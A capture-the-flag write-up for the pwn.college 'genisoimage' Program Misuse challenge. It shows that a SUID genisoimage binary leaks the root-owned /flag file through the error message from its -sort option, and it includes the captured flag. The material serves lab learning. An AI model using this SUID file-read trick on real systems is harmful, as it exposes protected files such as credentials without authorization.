---
layout: page
title: "Challenge Name: genisoimage"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/genisoimage`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/genisoimage
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/genisoimage
```

-The `s` in `-rws` indicates it's a SUID binary.
-`genisoimage` runs with **root privileges**.

## 🚀 Exploitation

The `genisoimage` is a command-line tool used to create ISO 9660 file system images (typically .iso) from files or directories.

But how can we reveal the flag by genisoimage , if it's only used for creating iso's? 
- the -sort command in genisoimage is used to sort the iso content made by weigths included in file given to -sort option of genisoimage.

We can parse /flag in -sort though it doesnt contain weight , the error can reveal the flag.

```bash
genisoimage -sort /flag
```

Output:
```
genisoimage: Incorrect sort file format
        pwn.college{ktPXbX6OZbHuRpPQ71lbIVqvy4Z.dVjNxwSM0IzMyEzW}
```

here the error simply reveals the flag.

      
